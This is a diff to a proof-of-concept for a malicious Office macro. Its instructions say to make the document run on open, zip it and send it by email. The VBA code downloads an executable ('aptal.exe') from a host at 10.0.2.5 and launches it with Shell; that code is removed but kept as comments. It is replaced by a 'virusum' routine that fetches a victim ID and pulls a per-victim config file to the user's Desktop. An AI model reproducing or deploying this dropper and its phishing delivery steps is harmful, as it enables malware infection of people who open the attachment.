@@ -8,26 +8,51 @@ PoC
 5. Save it. Then, when you open it, it will start automatically
 6. ZIP it. After that, send via mail
 
-Sub DownloadFile()
-    MsgBox "It's Begun"
-    Dim myURL As String
-    myURL = "http://10.0.2.5:8000/aptal.exe"
+Function DownloadFile(url As String, save_location As String)
+    ' MsgBox "File Download has Begun"
     
     Dim WinHttpReq As Object
     Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
-    WinHttpReq.Open "GET", myURL, False, "username", "password"
-    WinHttpReq.send
+    WinHttpReq.Open "GET", url, False
+    WinHttpReq.Send
     
     If WinHttpReq.Status = 200 Then
         Set oStream = CreateObject("ADODB.Stream")
         oStream.Open
         oStream.Type = 1
         oStream.Write WinHttpReq.responseBody
-        oStream.SaveToFile "C:\Users\rnsm\aptal.exe", 2 ' 1 = no overwrite, 2 = overwrite
+        oStream.SaveToFile save_location, 2 ' 1 = no overwrite, 2 = overwrite
         oStream.Close
     End If
+    ' MsgBox "File Download has Finished"
+End Function
 
-    strRoboappPath = "C:\Users\rnsm\aptal.exe" 'Your path here
-    varProc = Shell(strRoboappPath, 1)
-    MsgBox "It's Finished"
+Function httpGet(url As String)
+    With CreateObject("WinHttp.WinHttpRequest.5.1")
+        .Open "GET", url, False
+        .Send
+        httpGet = .ResponseText
+    End With
+End Function
+
+
+Public Sub virusum()
+
+
+    Dim username, domain, savelocation As String
+    username = Environ$("username")
+    domain = "http://10.0.2.5"
+    savelocation = "C:\Users\" + username + "\Desktop\"
+    
+    victimid = httpGet("http://10.0.2.5/getid")
+    
+    MsgBox savelocation + victimid + "_config.txt"
+    DownloadFile domain + "/config/" + victimid + "_config.txt", savelocation + victimid + "_config.txt"
+    
+    
 End Sub
+
+
+    ' strRoboappPath = "C:\Users\rnsm\aptal.exe" 'Your path here
+    ' varProc = Shell(strRoboappPath, 1)
+
